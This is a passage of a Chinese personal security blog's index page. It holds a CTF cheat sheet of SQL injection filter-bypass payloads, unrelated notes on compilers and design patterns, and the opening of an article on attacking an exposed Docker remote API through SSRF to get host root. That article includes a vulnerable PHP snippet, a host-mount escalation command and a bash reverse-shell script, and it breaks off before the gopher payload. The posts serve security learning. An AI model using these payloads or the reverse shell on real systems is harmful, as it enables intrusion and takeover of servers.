                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="XOR注入"><a href="#XOR注入" class="headerlink" title="XOR注入"></a>XOR注入</h3><ul>
<li><p>基本payload</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin^(ascii(mid((password)from(i)))&gt;j)^'1'='1'%23</span><br><span class="line">或者</span><br><span class="line">admin^(ascii(mid((password)from(i)for(1)))&gt;j)^'1'='1'%23</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ascii函数默认取字符串中第一个字符的ascii码作为输出  </p>
</blockquote>
</li>
<li><p>使用场景</p>
<ul>
<li>过滤了关键字:<code>and</code> <code>or</code></li>
<li>过滤了逗号</li>
<li>过滤了空格</li>
</ul>
</li>
</ul>
<h3 id="regexp注入"><a href="#regexp注入" class="headerlink" title="regexp注入"></a>regexp注入</h3><ul>
<li><p>基本payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select (select xxxx) regexp &apos;正则&apos;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用场景</p>
<ul>
<li>过滤了<code>=</code>，<code>in</code>,<code>like</code></li>
</ul>
</li>
</ul>
<h3 id="order-by-盲注"><a href="#order-by-盲注" class="headerlink" title="order by 盲注"></a>order by 盲注</h3><ul>
<li><p>基本payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where user_id=&apos;1&apos; union select 1,2,&apos;a&apos;,4,5,6,7 order by 3</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用场景</p>
<ul>
<li>过滤了列名</li>
<li>过滤了括号</li>
<li>适用于已知该表的列名以及列名位置的注入</li>
</ul>
</li>
</ul>
<h3 id="join注入"><a href="#join注入" class="headerlink" title="join注入"></a>join注入</h3><ul>
<li><p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select * from(select 1)a join (select 2)b %23</span><br><span class="line">union all</span><br><span class="line">select * from(</span><br><span class="line">    (select 1)a join(</span><br><span class="line">        select F.[需要查询的字段号] from(</span><br><span class="line">            select * from [需要查询的表有多少个字段就join多少个]</span><br><span class="line">            union</span><br><span class="line">            select * from [需要查询的表] [limit子句]</span><br><span class="line">        )F-- 我们创建的虚拟表没有表名，因此定义一个别名，然后直接[别名].[字段号]查询数据</span><br><span class="line">    )b-- 同上[还差多少字段就再join多少个，以满足字段数相同的原则]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用场景：</p>
<ul>
<li>过滤了逗号、字段名</li>
</ul>
</li>
</ul>
<h3 id="Other-tips"><a href="#Other-tips" class="headerlink" title="Other tips"></a>Other tips</h3><ul>
<li><p>一次性爆所有表名和字段名：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">SELECT</span> (@) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(@:=<span class="number">0x00</span>),(<span class="keyword">SELECT</span> (@) <span class="keyword">FROM</span> (information_schema.columns) <span class="keyword">WHERE</span> (table_schema&gt;=@) <span class="keyword">AND</span> (@)<span class="keyword">IN</span> (@:=<span class="keyword">CONCAT</span>(@,<span class="number">0x0a</span>,<span class="string">' [ '</span>,table_schema,<span class="string">' ] &gt;'</span>,table_name,<span class="string">' &gt; '</span>,column_name))))x)</span><br></pre></td></tr></table></figure></li>
</ul>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/编译原理——第一课-绪论-笔记/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/编译原理——第一课-绪论-笔记/index.html" itemprop="url">
                  编译原理——第一课-绪论-笔记
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-09-28 22:05:47" itemprop="dateCreated datePublished" datetime="2018-09-28T22:05:47+08:00">2018-09-28</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="第一课-绪论"><a href="#第一课-绪论" class="headerlink" title="第一课 绪论"></a>第一课 绪论</h2><h4 id="编译器在语言处理系统中的位置"><a href="#编译器在语言处理系统中的位置" class="headerlink" title="编译器在语言处理系统中的位置"></a>编译器在语言处理系统中的位置</h4><div id="flowchart-0" class="flow-chart"></div>



<h4 id="编译器的结构"><a href="#编译器的结构" class="headerlink" title="编译器的结构"></a>编译器的结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">graph TD;</span><br><span class="line">	字符流--&gt;词法分析器;</span><br><span class="line">	词法分析器--&gt;|词法单元流|语法分析器;</span><br><span class="line">	语法分析器--&gt;|语法树|语义分析器;</span><br><span class="line">	语义分析器--&gt;|语法树|中间代码生成器;</span><br><span class="line">	中间代码生成器--&gt;|中间表示形式|机器无关代码优化器;</span><br><span class="line">	机器无关代码优化器--&gt;|中间表示形式|目标代码生成器;</span><br><span class="line">	目标代码生成器--&gt;|目标机器语言|机器相关代码优化器;</span><br><span class="line">	机器相关代码优化器--&gt;目标机器语言;</span><br></pre></td></tr></table></figure>
<h5 id="词法分析-扫描-Scanning"><a href="#词法分析-扫描-Scanning" class="headerlink" title="词法分析/扫描(Scanning)"></a>词法分析/扫描(Scanning)</h5><ul>
<li><p>主要任务</p>
<p>从左向右逐行扫描源程序的字符，识别各个单词并确定类型，表示为<strong><em>词法单元(token)</em></strong>格式;</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>单词类型</th>
<th>种类</th>
<th>种别码</th>
</tr>
</thead>
<tbody>
<tr>
<td>关键字</td>
<td>program、if、else、then、…</td>
<td>一词一码</td>
</tr>
<tr>
<td>标识符</td>
<td>变量名、数组名、记录名、过程名、…</td>
<td>多词一码</td>
</tr>
<tr>
<td>常量</td>
<td>整型、浮点型、字符型、布尔型、…</td>
<td>一型一码</td>
</tr>
<tr>
<td>运算符</td>
<td>算数 关系 逻辑</td>
<td>一词一码或者一型一码</td>
</tr>
<tr>
<td>界限符</td>
<td>; () = {}…</td>
<td>一词一码</td>
</tr>
</tbody>
</table>
<h5 id="语法分析-parsing"><a href="#语法分析-parsing" class="headerlink" title="语法分析(parsing)"></a>语法分析(parsing)</h5><ul>
<li>从词法分析器的token序列中识别短语，构造语法分析树(parse tree)</li>
</ul>
<h5 id="语义分析"><a href="#语义分析" class="headerlink" title="语义分析"></a>语义分析</h5><ul>
<li>主要任务：<ul>
<li>收集标识符的属性信息<ul>
<li>种属<ul>
<li>简单变量、符合变量（数组、记录、…)、过程</li>
</ul>
</li>
<li>类型</li>
<li>存储位置、长度</li>
<li>值</li>
<li>作用域</li>
<li>参数与返回值信息</li>
</ul>
</li>
<li>语义检查</li>
</ul>
</li>
</ul>
<h5 id="中间代码生成"><a href="#中间代码生成" class="headerlink" title="中间代码生成"></a>中间代码生成</h5><ul>
<li>常用的中间表示形式<ul>
<li>三地址码<ul>
<li>类似汇编</li>
<li>每个指令最多三个操作数</li>
</ul>
</li>
<li>语法结构树/语法树(Syntax Trees)</li>
</ul>
</li>
</ul>
<h5 id="目标代码生成器"><a href="#目标代码生成器" class="headerlink" title="目标代码生成器"></a>目标代码生成器</h5><ul>
<li>以源程序的中间表示形式作为输入并映射到目标语言</li>
<li>重要任务：分配合理的寄存器</li>
</ul>
<h5 id="代码优化"><a href="#代码优化" class="headerlink" title="代码优化"></a>代码优化</h5><ul>
<li>等价程序变换以优化时空效率<script src="https://cdnjs.cloudflare.com/ajax/libs/raphael/2.2.7/raphael.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/flowchart/1.6.5/flowchart.min.js"></script><textarea id="flowchart-0-code" style="display: none">title: 
start=>start: 源程序
preprocessor=>operation: 预处理器(preprocessor)
compiler=>operation: 编译器(compiler)
assembler=>operation: 汇编器(assembler)
linker_and_loader=>operation: 链接器(Linker)/加载器(Loader)
end=>end: 目标机器代码

start->preprocessor
preprocessor->compiler
compiler->assembler
assembler->linker_and_loader
linker_and_loader->end</textarea><textarea id="flowchart-0-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-0-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-0-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-0", options);</script></li>
</ul>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/设计模式-第一课-六大原则/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/设计模式-第一课-六大原则/index.html" itemprop="url">
                  设计模式_第一课-六大原则
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-09-17 22:08:00" itemprop="dateCreated datePublished" datetime="2018-09-17T22:08:00+08:00">2018-09-17</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="设计模式的六大原则"><a href="#设计模式的六大原则" class="headerlink" title="设计模式的六大原则"></a>设计模式的六大原则</h1><h3 id="开闭原则-Open-Close-Principle"><a href="#开闭原则-Open-Close-Principle" class="headerlink" title="开闭原则(Open Close Principle)"></a>开闭原则(Open Close Principle)</h3><p>开闭原则的意思是：<code>对扩展开放，对修改关闭</code></p>
<ul>
<li>程序需要拓展时不能修改原有代码</li>
<li>使用接口和抽象类</li>
</ul>
<h3 id="里氏代换原则-Liskov-Substitution-Principle"><a href="#里氏代换原则-Liskov-Substitution-Principle" class="headerlink" title="里氏代换原则(Liskov Substitution Principle)"></a>里氏代换原则(Liskov Substitution Principle)</h3><p>任何基类可以出现的地方子类一定可以出现(派生类可以完全替换掉基类且软件单位的功能不受影响)</p>
<h3 id="依赖倒转原则-Dependence-Inversion-Principle"><a href="#依赖倒转原则-Dependence-Inversion-Principle" class="headerlink" title="依赖倒转原则(Dependence Inversion Principle)"></a>依赖倒转原则(Dependence Inversion Principle)</h3><p>这个原则是开闭原则的基础。</p>
<ul>
<li>针对接口编程</li>
<li>依赖于抽象而不依赖于具体</li>
</ul>
<h3 id="接口隔离原则-Interface-Segregation-Principle"><a href="#接口隔离原则-Interface-Segregation-Principle" class="headerlink" title="接口隔离原则(Interface Segregation Principle)"></a>接口隔离原则(Interface Segregation Principle)</h3><ul>
<li>使用多个隔离的接口比使用单个接口好</li>
<li>降低类之间的耦合度</li>
</ul>
<h3 id="迪米特法则，又称最少知道原则-Demeter-Principle"><a href="#迪米特法则，又称最少知道原则-Demeter-Principle" class="headerlink" title="迪米特法则，又称最少知道原则(Demeter Principle)"></a>迪米特法则，又称最少知道原则(Demeter Principle)</h3><p>一个实体应当尽少地与其他实体之间发生相互作用，使得系统功能模块相互独立</p>
<h3 id="合成复用原则-Composite-Reuse-Principle"><a href="#合成复用原则-Composite-Reuse-Principle" class="headerlink" title="合成复用原则(Composite Reuse Principle)"></a>合成复用原则(Composite Reuse Principle)</h3><p>尽量使用合成/聚合的方式而不是使用继承</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/SSRF-DOCKER-RCE/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/SSRF-DOCKER-RCE/index.html" itemprop="url">
                  利用SSRF攻击docker remote api从而获取服务器root权限的探索
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-08-16 08:57:59" itemprop="dateCreated datePublished" datetime="2018-08-16T08:57:59+08:00">2018-08-16</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>首发于freebuf <a href="http://www.freebuf.com/articles/web/179910.html">http://www.freebuf.com/articles/web/179910.html</a></p>
</blockquote>
<blockquote>
<p>这几天在做关于自动化部署docker镜像方面的项目，从而接触到了docker的api，而docker的api也可以通过tcp连接的形式来进行访问。那么从一个安全爱好者的角度出发，是否可以利用docker的远程api来实现提权等一系列的操作？查找了各种资料之后，最后我探索到了一条通过SSRF漏洞来攻击docker远程api从而最终还能够获得远程主机的root权限的攻击思路，并写了这篇文章来记录一下整个过程及其防范的方法。</p>
</blockquote>
<h2 id="什么是docker远程api？"><a href="#什么是docker远程api？" class="headerlink" title="什么是docker远程api？"></a>什么是docker远程api？</h2><p>Docker Remote API是docker团队为了方便我们远程管理docker而为我们提供的一套api接口。在默认的情况下，docker daemon坚挺在unix socket上，通常为unix:///var/run/docker.sock。此外，在一些情况比如当我们需要远程管理docker服务器或者是创建docker集群的情况下，我们往往需要开启docker的远程api。这里给出在ubuntu上的一种开启方法：</p>
<ul>
<li>编辑<code>/lib/systemd/system/docker.service</code>文件，修改ExecStart一行为：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">Type=notify</span><br><span class="line"># the default is not to use systemd for cgroups because the delegate issues still</span><br><span class="line"># exists and systemd currently does not support the cgroup feature set required</span><br><span class="line"># for containers run by docker</span><br><span class="line">ExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:4243</span><br><span class="line">ExecReload=/bin/kill -s HUP $MAINPID</span><br><span class="line">LimitNOFILE=1048576</span><br></pre></td></tr></table></figure>
<ul>
<li>之后再重启docker</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure>
<p>我们便可以利用docker client或者任意http客户端访问docker服务，例如<img src="http://image.3001.net/images/20180806/1533549633_5b681c41397a8.png!small" alt="docker_remote.png"></p>
<p>可以看到docker提供的api其实也是一个restful形式的http接口，具体的文档可以再docker的官网获取：<a href="https://docs.docker.com/engine/api/v1.24/#31-containers">Engine API V1.24</a></p>
<p>这里列出几个重要的接口：</p>
<ul>
<li>列出所有的容器</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http:/localhost:4243/v1.24/containers/json</span><br></pre></td></tr></table></figure>
<ul>
<li>列出所有镜像</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl http:/localhost:4243/v1.24/images/json[&#123;</span><br><span class="line">  &quot;Id&quot;:&quot;sha256:31d9a31e1dd803470c5a151b8919ef1988ac3efd44281ac59d43ad623f275dcd&quot;,</span><br><span class="line">  &quot;ParentId&quot;:&quot;sha256:ee4603260daafe1a8c2f3b78fd760922918ab2441cbb2853ed5c439e59c52f96&quot;,</span><br><span class="line">  ...</span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure>
<ul>
<li>创建并运行容器</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ curl  -H &quot;Content-Type: application/json&quot; \</span><br><span class="line">  -d &apos;&#123;&quot;Image&quot;: &quot;alpine&quot;, &quot;Cmd&quot;: [&quot;echo&quot;, &quot;hello world&quot;]&#125;&apos; \</span><br><span class="line">  -X POST http:/localhost:4243/v1.24/containers/create</span><br><span class="line">&#123;&quot;Id&quot;:&quot;1c6594faf5&quot;,&quot;Warnings&quot;:null&#125;</span><br><span class="line"></span><br><span class="line">$ curl   -X POST http:/localhost:4243/v1.24/containers/1c6594faf5/start</span><br><span class="line"></span><br><span class="line">http:/localhost:4243/v1.24/containers/1c6594faf5/wait</span><br><span class="line">&#123;&quot;StatusCode&quot;:0&#125;</span><br><span class="line"></span><br><span class="line">$ curl  &quot;http:/localhost:4243/v1.24/containers/1c6594faf5/logs?stdout=1&quot;</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
<p>可以看到如果开放了docker远程api，我们便可以使用restful接口来实现一切docker容器的操作。</p>
<h2 id="怎样利用docker容器提权？"><a href="#怎样利用docker容器提权？" class="headerlink" title="怎样利用docker容器提权？"></a>怎样利用docker容器提权？</h2><p>有些朋友可能会问了：docker容器内部是一个虚拟化的环境，与主机隔离，那么怎样才能利用docker容器达到主机的控制权？这里就涉及到docker运行时的用户权限了。<code>docker daemon</code>运行时是以root用户运行，因而具有极大的权限：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ps aux|grep dockerd</span><br><span class="line">root      1723  0.1  0.8 563472 68900 ?        Ssl  17:17   0:24 /usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:4243</span><br><span class="line">image    25504  0.0  0.0  15984   936 pts/3    S+   21:12   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn dockerd</span><br></pre></td></tr></table></figure>
<p>那么怎样通过docker daemon最终获得服务器的root权限？这里我们可以利用docker挂载宿主机文件的功能，直接挂载高权限目录，从而在容器内部获取宿主机的控制权限。这里有一个黑魔法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</span><br></pre></td></tr></table></figure>
<p>运行后的输出如下：<img src="http://image.3001.net/images/20180806/1533549670_5b681c66b2a75.png!small" alt="verify">我们退出docker,查看宿主机/root/目录：<img src="http://image.3001.net/images/20180806/1533549678_5b681c6ee6b4c.png!small" alt="success">可以看到我们成功写入了/root文件夹一个文件。上面那条命令 <code>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</code>主要的作用是：从 Docker Hub 上面下载我们指定的镜像，然后运行。参数 -v 将容器外部的目录 / 挂载到容器内部 /hostOS，并且使用 -i 和 -t 参数进入容器的 shell。而这个镜像<code>rootplease</code>在容器内部执行了一个脚本<code>exploit.sh</code>，主要内容便是chroot到/hostOS中。这样我们便通过读写宿主机的任意文件实现了获取宿主机的最高权限。这个镜像的源码可以在<a href="https://github.com/chrisfosterelli/dockerrootplease/blob/master/exploit.sh">Github</a>上获取。</p>
<h2 id="怎样通过SSRF完成攻击？"><a href="#怎样通过SSRF完成攻击？" class="headerlink" title="怎样通过SSRF完成攻击？"></a>怎样通过SSRF完成攻击？</h2><p>这里我们的服务器端环境如下:</p>
<p><img src="http://image.3001.net/images/20180806/1533549693_5b681c7d2b544.png!small" alt="environ"></p>
<p>这里我们来看在php中经常出现的导致SSRF漏洞的代码实现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$curl=curl_init();</span><br><span class="line">curl_setopt($curl,CURLOPT_URL,$_GET[&apos;url&apos;]);</span><br><span class="line">curl_setopt($curl,CURLOPT_HEADER,0);</span><br><span class="line">curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);</span><br><span class="line">$data=curl_exec($curl);</span><br><span class="line">curl_close($curl);</span><br><span class="line">print_r($data);</span><br></pre></td></tr></table></figure>
<p>php中通常使用libcurl来实现http请求，这里可以看到<code>$_GET[&#39;url&#39;]</code>可控，从而可以请求任意站点，从而构成了SSRF漏洞。但是有的读者有可能会问：docker的api有很大一部分是需要post的，那么怎样才能发送post封包？这里便祭出我们的大杀器——<code>gopher协议</code>。Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。 这里Ricterz师傅曾经写过一篇很好的<a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2">关于gopher协议扩展ssrf攻击面的文章</a>。因此我们便可以通过gopher协议来访问内网开放的<code>docker api</code>从而实现攻击。我们可以先尝试获取所有的镜像：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@1ae6b62d1757:/var/www/html# curl localhost/curl.php?url=http://172.17.0.1:4243/containers/json</span><br><span class="line">[&#123;&quot;Id&quot;:&quot;fa169d6b4239882bb6a0a2d564fd9891c04cf199ac12daec514f69febf960e9b&quot;,&quot;Names&quot;:[&quot;/quirky_mcnulty&quot;],&quot;Image&quot;:&quot;chrisfosterelli/rootplease&quot;,&quot;ImageID&quot;:&quot;sha256:0db941813769383d7ed3bdcccd27af1b6d7b47ed0fb33f1b47f7bb937529fa3e&quot;,&quot;Command&quot;:&quot;/bin/bash exploit.sh&quot;,&quot;Created&quot;:1533475418,&quot;Ports&quot;:[],&quot;Labels&quot;:&#123;&#125;,&quot;State&quot;:&quot;running&quot;,&quot;Status&quot;:&quot;Up 17 minutes&quot;,&quot;HostConfig&quot;:&#123;&quot;NetworkMode&quot;:&quot;default&quot;&#125;,&quot;NetworkSettings&quot;:&#123;&quot;Networks&quot;:&#123;&quot;bridge&quot;:&#123;&quot;IPAMConfig&quot;:null,&quot;Links&quot;:null,&quot;Aliases&quot;:null,&quot;NetworkID&quot;:&quot;9a8a2dd6afbbc355194a5fd224757ac8fe11760dbfde91c07c46689146e15089&quot;,&quot;EndpointID&quot;:&quot;a079ba4ac68eafb5add6b56822dd13a288ca059a815e7a011e82bdcb8fd8542b&quot;,&quot;Gateway&quot;:&quot;172.17.0.1&quot;,&quot;IPAddress&quot;:&quot;172.17.0.4&quot;,&quot;IPPrefixLen&quot;:16,&quot;IPv6Gateway&quot;:&quot;&quot;,&quot;GlobalIPv6Address&quot;:&quot;&quot;,&quot;GlobalIPv6PrefixLen&quot;:0,&quot;MacAddress&quot;:&quot;02:42:ac:11:00:04&quot;,&quot;DriverOpts&quot;:null&#125;&#125;&#125;,&quot;Mounts&quot;:[&#123;&quot;Type&quot;:&quot;bind&quot;,&quot;Source&quot;:&quot;/&quot;,&quot;Destination&quot;:&quot;/hostOS&quot;,&quot;Mode&quot;:&quot;&quot;,&quot;RW&quot;:true,&quot;Propagation&quot;:&quot;rslave&quot;&#125;]&#125;,]</span><br></pre></td></tr></table></figure>
<p>我们可以先构造一个特殊的docker镜像，并将之上传到DockerHub</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:14.04</span><br><span class="line">COPY exploit.sh /exploit.sh</span><br><span class="line">ENTRYPOINT [&quot;/bin/bash&quot;, &quot;exploit.sh&quot;]</span><br></pre></td></tr></table></figure>
<p>这里我们的exploit.sh的写法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/$1/$2 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>这里的docker镜像已经上传到了<a href="https://hub.docker.com/r/imagemlt/reverse_shell/">dockerhub</a>。</p>
<p>之后我们可以先构造合适的post封包：</p>
